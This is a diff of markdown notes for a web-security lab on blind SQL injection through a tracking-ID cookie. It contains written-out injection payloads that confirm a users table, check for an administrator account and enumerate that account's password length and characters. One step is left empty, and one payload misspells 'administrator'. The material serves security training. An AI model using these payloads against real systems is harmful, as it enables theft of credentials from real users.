@@ -1,22 +1,31 @@
-## Exploiting blind SQL injection by triggering conditional responses - Continued
+## Exploiting blind SQL injection by triggering conditional responses
 
+On this lab the TrackingID is vulnerable to SQL Injection.
 For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
 
-To do this, start with the following input:
+### 1 Confirm Blind SQL Injection
 
-`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
 
-This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
+### 2 Confirm we have Users table
+- ' and (select 'x' from users LIMIT 1)='x' --'
+`trackingId = 'Rv4c456' and (select 'x' from users LIMIT 1)='x' --'`
 
-Next, we send the following input:
+### 3 Confirm that username administrator exists users table
+- ' and (select username from users where username='administrator')='adminisrator'--'`
+`trackingId = 'Rv4c456' and (select username from users where username='administrator')='adminisrator'--'`
 
-`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
+### 4 Enumerate the password of administrator
 
-This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
+##### Enumerate Password Length
+- ' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
+`trackingId = 'Rv4c456' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'`
 
-Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:
-`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
-e can continue this process to systematically determine the full password for the `Administrator` user.
+
+#### Ref:
+[Youtube video](https://www.youtube.com/watch?v=LBG_n9fr8sM)
+
+
+
 
 >[!NOTE]
 >The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.
